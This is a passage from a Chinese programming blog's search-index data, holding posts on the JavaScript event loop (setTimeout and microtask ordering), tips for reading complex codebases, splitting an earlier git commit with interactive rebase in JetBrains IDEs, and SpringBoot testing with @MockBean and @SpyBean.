到达指定时间可能并不会立即执行\nsetTimeout(function () { console.log(1); }, 0); function delay(duration) { var start = Date.now(); while (Date.now() - start \u0026lt; duration) {} } delay(3000); console.log(2); 效果：卡死 3s 后输出 2 1\n3. 微队列 使用 Promise.resolve().then 可以将任务直接添加到微队列\nsetTimeout(function () { console.log(1); }, 0); Promise.resolve().then(function () { console.log(2); }); console.log(3); 效果：依次输出 3 2 1\n4. 复杂情况 function a() { console.log(1); Promise.resolve().then(function () { console.log(2); }); } setTimeout(function () { console.log(3); Promise.resolve().then(a); }, 0); Promise.resolve().then(function () { console.log(4); }); console.log(5); 效果：依次输出 5 4 3 1 2\n拓展 理解了上面的概念，可以尝试分析一下 现代 JavaScript 教程 事件循环例子，检查一下是否理解了事件循环\n参考资料 2024 年我还在写这样的代码 为什么 JS 要加入 setTimeout， css 的 transition 才能生效 深入理解和使用 Javascript 中的 setTimeout(fn,0) 主线程 并发模型与事件循环 异步 JavaScript 调度：setTimeout 和 setInterval\n","permalink":"https://aaronlinv.github.io/posts/javascript-%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF-%E5%8A%A8%E7%94%BB%E6%BC%94%E7%A4%BA/","summary":"\u003cp\u003e在前端代码中很经常看到使用 \u003ccode\u003esetTimeout(fn, 0)\u003c/code\u003e，如下面代码所示，乍一看很多余，但是移除了可能会出现一些奇奇怪怪的问题。要解释这个就需要理解 \u003cstrong\u003e事件循环（Event Loop）\u003c/strong\u003e，下面会通过一些例子和动画来辅助理解事件循环\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-js\" data-lang=\"js\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nx\"\u003esetTimeout\u003c/span\u003e\u003cspan class=\"p\"\u003e(()\u003c/span\u003e \u003cspan class=\"p\"\u003e=\u0026gt;\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"c1\"\u003e// 调用一些方法\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e\u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"为什么使用事件循环\"\u003e为什么使用事件循环\u003c/h2\u003e\n\u003cp\u003eJS 是单线程的（\u003ca href=\"https://www.reddit.com/r/node/comments/nqxelw/why_everyone_is_saying_that_js_is_single_threaded/\"\u003e浏览器和 Node则是多线程的\u003c/a\u003e），为了避免 \u003cstrong\u003e渲染主线程\u003c/strong\u003e 阻塞，需要异步，\u003cstrong\u003e事件循环\u003c/strong\u003e 是异步的实现方式\u003c/p\u003e\n\u003cp\u003e浏览器在一个渲染主线程中运行一个页面中的所有 JavaScript 脚本，以及呈现布局，回流，和垃圾回收。为了避免 \u003cstrong\u003e同步\u003c/strong\u003e 的执行方式导致渲染主线程阻塞，使得页面卡死，所以浏览器采用异步的方式：渲染主线程将任务交给其他线程去处理，自身 \u003cstrong\u003e立即结束\u003c/strong\u003e 任务的执行，转而执行后续代码，当其他线程完成时，将事先传递的回调函数包装成任务，加入到对应的消息队列的\u003cstrong\u003e末尾\u003c/strong\u003e排队，等待渲染主线程调度执行\u003c/p\u003e\n\u003cp\u003e流程：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e渲染主线程执行全局 JS，需要异步的任务放到对应的队列，如果是 \u003ccode\u003esetTimeout\u003c/code\u003e 则会有线程计时，到了指定时间会将任务放入 \u003ccode\u003e延时队列\u003c/code\u003e（并非立即执行）\u003c/li\u003e\n\u003cli\u003e渲染主线程为空时，按队列的优先级依次选择队列（最先执行微队列的任务），依次按顺序执行各个队列的任务\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e任务没有优先级，而消息队列有优先级，不同任务分属于不同队列：\u003ca href=\"https://html.spec.whatwg.org/multipage/webappapis.html#generic-task-sources\"\u003e参考 W3C 规范\u003c/a\u003e。\u003ca href=\"https://html.spec.whatwg.org/multipage/webappapis.html#perform-a-microtask-checkpoint\"\u003e微队列优先级最高\u003c/a\u003e，接着是交互队列然后才是延时队列\u003c/p\u003e\n\u003cp\u003e常见队列：\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e微队列（microtask）：⽤户存放需要最快执⾏的任务，优先级「最⾼」，通过 \u003ccode\u003ePromise.resolve().then()\u003c/code\u003e ⽴即把⼀个函数添加到微队列\u003c/li\u003e\n\u003cli\u003e交互队列：⽤于存放⽤户操作后产⽣的事件处理任务，优先级「⾼」\u003c/li\u003e\n\u003cli\u003e延时队列：⽤于存放计时器到达后的回调任务，优先级「中」\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"事件循环\"\u003e事件循环\u003c/h2\u003e\n\u003cp\u003e下面例子来自于：\u003ca href=\"https://ke.qq.com/course/5892689\"\u003e《WEB前端大师课》\u003c/a\u003e，大块的文字描述相对没那么直观，所以用 Keynote 做了 gif 方便理解（如果有更好的做 gif 的方式可以留言告诉我）\u003c/p\u003e\n\u003ch3 id=\"1-js阻碍页面渲染\"\u003e1. JS阻碍页面渲染\u003c/h3\u003e\n\u003cp\u003eJS 修改了 DOM 后，并不会马上显示在页面上，需要进行 \u003cstrong\u003e绘制\u003c/strong\u003e 后才会显示页面变更\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-html\" data-lang=\"html\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003ehtml\u003c/span\u003e \u003cspan class=\"na\"\u003elang\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;en\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003ehead\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003ehead\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003eh1\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e初始h1\u003cspan class=\"p\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003eh1\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003ebutton\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003echange\u003cspan class=\"p\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003ebutton\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nt\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eh1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003equerySelector\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;h1\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ebtn\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003edocument\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003equerySelector\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;button\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003edelay\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eduration\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003estart\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eDate\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003enow\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nb\"\u003eDate\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003enow\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"nx\"\u003estart\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"nx\"\u003eduration\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"nx\"\u003ebtn\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eonclick\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e()\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003eh1\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003etextContent\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;修改h1 textContent\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nx\"\u003edelay\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e3000\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"p\"\u003e};\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"p\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003escript\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"p\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003ebody\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e\u0026lt;/\u003c/span\u003e\u003cspan class=\"nt\"\u003ehtml\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026gt;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e\u003cimg alt=\"01绘制任务\" loading=\"lazy\" src=\"../JavaScript%E4%BA%8B%E4%BB%B6%E5%BE%AA%E7%8E%AF%E5%8A%A8%E7%94%BB%E6%BC%94%E7%A4%BA/1929786-20240416173932693-109077340.gif\"\u003e\u003c/p\u003e","title":"JavaScript 事件循环 动画演示"},{"content":" 先跑起来，通过文档和实践熟悉业务流程\n这一步可以通过看官方文档开始，要注意的是一些项目是 更新先于文档 的，比如新版本启动方式有变更，但是文档还没更新。跟着文档不一定能把项目跑起来，需要借助 GitHub Issue 或者是 Slack 这样的工具以获取即时的帮助\n看测试，通过测试了解流程\n如果是开源项目，可以通过 GitHub Action 快速了解需要哪些依赖、如何快速运行测试，便于在本地运行测试，通过这些集成测试可以快速弄懂业务主线\n通过 debug 高效快速地梳理流程\n通过断点可以一步一步跟踪程序的运行，可以比较直观地看调用栈、变量等等的\n对于一些无法本地调试的项目来说，我们可以退而求其次，断点它的测试，这也是一个很有效的方法\n画图：降低复杂度\n很多项目会使用一些比较优雅的设计或是引入一些抽象层，这样代码读起来就会跳来跳去，层级深的话就很容把人给绕晕了\n可以用 draw.io 或者 excalidraw 等工具，根据实际情况画一画 活动图、时序图等\n提出具体的问题，带着问题看项目\n如果只是盲目地看项目代码，可能看完还是一头雾水，但是如果能提出一个具体问题，或是带着一个需求去看，效果就会好得多\n比如我提出问题：“某个任务在集群内是如何完成的？”，我可能会先去找到该任务的创建入口，然后顺藤摸瓜，找到任务的调度逻辑，顺着 happy path 找到下发任务的逻辑，再找到 Woker 的处理逻辑，这样就能弄懂整个调度流程\n最后如果能用 一句话 回答提出的问题，那可能能说明你对这个问题涉及的知识已经有了一个比较好的理解\n英语很重要\n大多数项目的注释、日志等的都是英文，看懂这些能极大提高效率\n","permalink":"https://aaronlinv.github.io/posts/%E5%A6%82%E4%BD%95%E5%BC%84%E6%87%82%E5%A4%8D%E6%9D%82%E9%A1%B9%E7%9B%AE/","summary":"\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e先跑起来，通过文档和实践熟悉业务流程\u003c/p\u003e\n\u003cp\u003e这一步可以通过\u003ca href=\"%5Bhttps://plantegg.github.io/2023/04/06/%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E4%B8%8D%E5%8E%BB%E7%9C%8B%E6%96%87%E6%A1%A3/%5D(https://plantegg.github.io/2023/04/06/%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BD%A0%E4%B8%8D%E5%8E%BB%E7%9C%8B%E6%96%87%E6%A1%A3/)\"\u003e看官方文档\u003c/a\u003e开始，要注意的是一些项目是 \u003cstrong\u003e更新先于文档\u003c/strong\u003e 的，比如新版本启动方式有变更，但是文档还没更新。跟着文档不一定能把项目跑起来，需要借助 GitHub Issue 或者是 Slack 这样的工具以获取即时的帮助\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e看测试，通过测试了解流程\u003c/p\u003e\n\u003cp\u003e如果是开源项目，可以通过 \u003ca href=\"https://twitter.com/yihong0618/status/1621897825431990276\"\u003eGitHub Action 快速了解需要哪些依赖、如何快速运行测试\u003c/a\u003e，便于在本地运行测试，通过这些集成测试可以快速弄懂业务主线\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e通过 debug 高效快速地梳理流程\u003c/p\u003e\n\u003cp\u003e通过断点可以一步一步跟踪程序的运行，可以比较直观地看调用栈、变量等等的\u003c/p\u003e\n\u003cp\u003e对于一些无法本地调试的项目来说，我们可以退而求其次，断点它的测试，这也是一个很有效的方法\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e画图：降低复杂度\u003c/p\u003e\n\u003cp\u003e很多项目会使用一些比较优雅的设计或是引入一些抽象层，这样代码读起来就会跳来跳去，层级深的话就很容把人给绕晕了\u003c/p\u003e\n\u003cp\u003e可以用 \u003ca href=\"http://draw.io\"\u003edraw.io\u003c/a\u003e 或者 \u003ca href=\"https://excalidraw.com/\"\u003eexcalidraw\u003c/a\u003e 等工具，根据实际情况画一画 活动图、时序图等\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e提出具体的问题，带着问题看项目\u003c/p\u003e\n\u003cp\u003e如果只是盲目地看项目代码，可能看完还是一头雾水，但是如果能提出一个具体问题，或是带着一个需求去看，效果就会好得多\u003c/p\u003e\n\u003cp\u003e比如我提出问题：“某个任务在集群内是如何完成的？”，我可能会先去找到该任务的创建入口，然后顺藤摸瓜，找到任务的调度逻辑，顺着 \u003ca href=\"https://www.zhihu.com/question/398382396/answer/1254936358\"\u003ehappy path\u003c/a\u003e 找到下发任务的逻辑，再找到 Woker 的处理逻辑，这样就能弄懂整个调度流程\u003c/p\u003e\n\u003cp\u003e最后如果能用 \u003cstrong\u003e一句话\u003c/strong\u003e 回答提出的问题，那可能能说明你对这个问题涉及的知识已经有了一个比较好的理解\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e英语很重要\u003c/p\u003e\n\u003cp\u003e大多数项目的注释、日志等的都是英文，看懂这些能极大提高效率\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e","title":"如何弄懂复杂项目"},{"content":"最近在合并上游代码，遇到了一个问题：某个 commit 杂糅了几个不同的特性修改，这可能会导致 rebase 上游代码时需要再对该 commit 进行额外的代码冲突处理\n解决方法：合并上游分支前，拆分杂糅的 commit，并将其中不同的特性修改合并（Squash）回相关的 commit。可以直接通过命令行进行操作，可以参考：Break a previous commit into multiple commits。也可以通过 JetBrains 家内置的 Git 进行操作，下面会介绍 IDEA 图形化操作的方法\n非先前 commit 的拆分 对于刚提交的 commit，要拆分多个 commit 是非常容易的，因为我们只要 soft reset commit，将 commit 内容撤销回至 暂存区，就可以随意提交 commit\n如果对于 soft reset 不太了解，可以参考我之前的博客：Git 中的回退操作：reset 和 revert 先前 commit 的拆分 先前 commit 指的是：在目标 commit 后已经有了若干个 commit。它无法直接通过 soft reset 进行拆分，因为这样会丢失后续的 commit，如下图，我们需要拆分 B commit，我们就无法直接使用 soft reset ，因为这样会丢失 C 和 D commit 的修改\n所以我们需要使用 rebase，具体步骤：\n在 交互式 (interactive) rebase 中将 B 标记为 edit，这时 B 后面的 commit 会被暂时隐藏起来 使用 soft reset 将 B 撤销回 暂存区 将 B 的修改内容分多个 commit 提交 B1 和 B2 使用 rebase 的 continue 将刚才隐藏的 C 和 D 恢复回来，需要注意的是：因为之前的 commit 记录已经改变了，所以这时的 C 和 D 已经与原来的 commit 记录不相同，故标记为 C' 和 D' 实例准备 演示使用 IDEA，其实 JetBrains 家的使用逻辑差不多，示例仓库使用：Learn Go with Tests\ngit clone git@github.com:quii/learn-go-with-tests.git 需要用到 Rebase，IDEA 默认保护主分支，改写 commit 记录的功能会被禁用\n需要先取消分支保护，移除 Protected branches 中的 master;main\n假设我们需要将下面 commit 拆分为两个： 1. 启动 Rebase 并标记目标 commit 为 edit 点击 Interactively Rebase from Here... 选择需要拆分的 commit，右键选择 Stop to Edit，然后再点击 Start Rebasing 这时有右下角会提示您正在处于 Rebase 状态 选择框可以选择 Continue 即继续 Rebase，Abort 则会退出 Rebase commit 列表也会显示感叹号 2. 使用 soft reset 将 commit 撤销回 暂存区 我们需要先 soft reset 到目标 commit 的上一个 commit 选择上一个 commit，右键选择：Reset Current Branch to Here... 选择 Soft，这样目标 commit 的修改就会退回到暂存区 3. 将暂存区改动分为若干个 commit 提交 这个时候我们就可以继续分开提交两次 commit 查看 log，两条 commit 被成功提交 4. 使用 rebase 的 continue 恢复剩下的 commit 这时候我们需要继续 Rebase，将剩下的 commit 还原回去：点击右下角分分支按钮，选择 Continue Rebase 完成 Rebase 后，剩余的 commit 就会被追加到我们新提交的 commit 后面，至此我们就完成了先前 commit 的拆分 Rebase edit 的拓展 因为这里的案例只是拆分 commit，没有对 commit 进行修改，如果是修改的话，修改完成后需要使用 git add 将文件标记为已修改，才能使用 rebase 的 continue，这样该 commit 就会被修改。后续的 commit 有可能与本次的改动产生冲突，需要手动处理冲突\n参考资料 Break a previous commit into multiple commits\n","permalink":"https://aaronlinv.github.io/posts/idea-%E4%BB%BB%E6%84%8F-jetbrains-ide%E6%8B%86%E5%88%86%E5%85%88%E5%89%8D-commit/","summary":"\u003cp\u003e最近在合并上游代码，遇到了一个问题：某个 commit 杂糅了几个不同的特性修改，这可能会导致 rebase 上游代码时需要再对该 commit 进行额外的代码冲突处理\u003c/p\u003e\n\u003cp\u003e解决方法：合并上游分支前，拆分杂糅的 commit，并将其中不同的特性修改合并（Squash）回相关的 commit。可以直接通过命令行进行操作，可以参考：\u003ca href=\"https://stackoverflow.com/a/6217314\"\u003eBreak a previous commit into multiple commits\u003c/a\u003e。也可以通过 JetBrains 家内置的 Git 进行操作，下面会介绍 IDEA 图形化操作的方法\u003c/p\u003e\n\u003ch2 id=\"非先前-commit-的拆分\"\u003e非先前 commit 的拆分\u003c/h2\u003e\n\u003cp\u003e对于刚提交的 commit，要拆分多个 commit 是非常容易的，因为我们只要 \u003ccode\u003esoft reset\u003c/code\u003e commit，将 commit 内容撤销回至 \u003ccode\u003e暂存区\u003c/code\u003e，就可以随意提交 commit\u003c/p\u003e\n\u003cp\u003e如果对于 \u003ccode\u003esoft reset\u003c/code\u003e 不太了解，可以参考我之前的博客：\u003ca href=\"https://www.cnblogs.com/aaronlinv/p/16454183.html\"\u003eGit 中的回退操作：reset 和 revert \u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"先前-commit-的拆分\"\u003e先前 commit 的拆分\u003c/h2\u003e\n\u003cp\u003e先前 commit 指的是：在目标 commit 后已经有了若干个 commit。它无法直接通过 \u003ccode\u003esoft reset\u003c/code\u003e 进行拆分，因为这样会丢失后续的 commit，如下图，我们需要拆分 \u003ccode\u003eB\u003c/code\u003e commit，我们就无法直接使用 \u003ccode\u003esoft reset\u003c/code\u003e ，因为这样会丢失 \u003ccode\u003eC\u003c/code\u003e 和 \u003ccode\u003eD\u003c/code\u003e commit 的修改\u003c/p\u003e\n\u003cp\u003e所以我们需要使用 rebase，具体步骤：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e在 交互式 (interactive) rebase 中将 \u003ccode\u003eB\u003c/code\u003e 标记为 \u003ccode\u003eedit\u003c/code\u003e，这时 \u003ccode\u003eB\u003c/code\u003e 后面的 commit 会被暂时隐藏起来\u003c/li\u003e\n\u003cli\u003e使用 \u003ccode\u003esoft reset\u003c/code\u003e 将 \u003ccode\u003eB\u003c/code\u003e 撤销回 \u003ccode\u003e暂存区\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e将 \u003ccode\u003eB\u003c/code\u003e 的修改内容分多个 commit 提交 \u003ccode\u003eB1\u003c/code\u003e 和 \u003ccode\u003eB2\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e使用 rebase 的 \u003ccode\u003econtinue\u003c/code\u003e 将刚才隐藏的 \u003ccode\u003eC\u003c/code\u003e 和 \u003ccode\u003eD\u003c/code\u003e 恢复回来，需要注意的是：因为之前的 commit 记录已经改变了，所以这时的 \u003ccode\u003eC\u003c/code\u003e 和 \u003ccode\u003eD\u003c/code\u003e 已经与原来的 commit 记录不相同，故标记为 \u003ccode\u003eC'\u003c/code\u003e 和 \u003ccode\u003eD'\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"../IDEA%EF%BC%88%E4%BB%BB%E6%84%8FJetBrainsIDE%EF%BC%89%E6%8B%86%E5%88%86%E5%85%88%E5%89%8Dcommit/1929786-20240406133647807-70803179.png\"\u003e\u003c/p\u003e","title":"IDEA （任意 JetBrains IDE）拆分先前 commit"},{"content":"上一节：SpringBoot 测试实践 - 2：单元测试与集成测试\n编写测试的时候，我们必须保证外部依赖行为一致，也需要模拟一些边界条件，所以我们需要使用 Mock 来模拟对象的行为。SpringBoot 提供了 @MockBean 和 @SpyBean 注解，可以方便地将模拟对象与 Spring 测试相结合，简化测试代码的编写\n@MockBean @MockBean 是 Spring Boot Test提供的注解，用于在 Spring Boot 测试中创建一个模拟的 Bean 实例，并注入到测试类中的依赖项中。使用 Mock 可以控制被 Mock 对象的行为：自定义返回值、抛出指定异常等，模拟各种可能的情况，提高测试的覆盖率\n@SpringBootTest @RunWith(SpringRunner.class) public class MyServiceTest { @MockBean private ExternalDependency externalDependency; @Autowired private MyService myService; @Test public void testSomeMethod() { // 定义外部依赖的行为 Mockito.when(externalDependency.someMethod()).thenReturn(\u0026#34;Mocked Result\u0026#34;); // 调用被测试类的方法 // 被测方法内部调用了 ExternalDependency 的 someMethod 方法 String result = myService.someMethod(); // 验证外部依赖的方法是否被调用 Mockito.verify(externalDependency).someMethod(); // 断言结果 assertEquals(\u0026#34;Mocked Result\u0026#34;, result); } } 需要注意的是：使用了 @MockBean，会创建完全模拟的对象，它完全替代了被模拟的 Bean，并且所有方法的调用都被模拟。对于未指定行为的方法，返回值如果是基本类型则返回对应基本类型的默认值，如果是引用类型则返回 null\n@SpyBean @SpyBean 是 Spring Boot Test 提供的另一个注解，与 @MockBean 作用相似，但是它创建的是部分模拟对象，未指定方法行为时，将执行被模拟对象的真实实现，返回实际方法的执行结果\n常见的情况是：测试依赖外部资源（例如数据库、文件系统等）的方法，我们要在测试中模拟其中一部分方法的行为，同时保留对外部资源的实际访问，那么可以使用 @SpyBean\n@SpringBootTest public class MyServiceTest { @Autowired private MyService myService; @SpyBean private MyRepository myRepository; @Test public void testMyService() { // 使用 doReturn 方法模拟调用 myRepository 的方法，并返回指定的值 Mockito.doReturn(new MyEntity()).when(myRepository).findById(1L); MyResult result = myService.doSomething(1L); Assertions.assertEquals(\u0026#34;success\u0026#34;, result.getMessage()); } } 这里有一个很重要的点是：@SpyBean 使用 doReturn 而不是 thenReturn，因为 Spy 对象是基于实例创建的，而 thenReturn 方法会调用实例方法并返回模拟结果，这可能会导致实例状态发生变化，从而影响后续的测试步骤。换而言之如果 Spy 对象使用 doReturn 就像这样：Mockito.when(myRepository.findById(1L)).thenReturn(new MyEntity());这段代码我们本意是指定这个 Spy 对象的 findById(1L) 的行为，但是实际上 when 语句中 myRepository.findById(1L) 已经执行了了实际的逻辑，这可能影响整个测试\n简化 Spring Context 提升测试运行速度 SpringBoot 测试实践 - 2：单元测试与集成测试 中提到了单元测试用到的 @MybatisTest 以及集成测试用到的 @SpringBootTest。@SpringBootTest 加载整个 Spring Boot 应用程序的上下文，就像启动了整个 SpringBoot 应用，而 @MybatisTest 只配置了用于测试 MyBatis 的组件，速度就非常快。完整的项目有大量的测试用例，如果每个测试都重新加载 Spring Context 这样就非常耗时，所以要尽量减少 @SpringBootTest\n一般业务代码都会注入外部依赖，如果只在测试方法上使用 @Test 注解，这样运行测试就会抛出空指针异常，需要在类上使用 @ExtendWith(SpringExtension.class) 将 Spring 的测试支持集成到 JUnit 5 中，这样就可以在测试类中获得 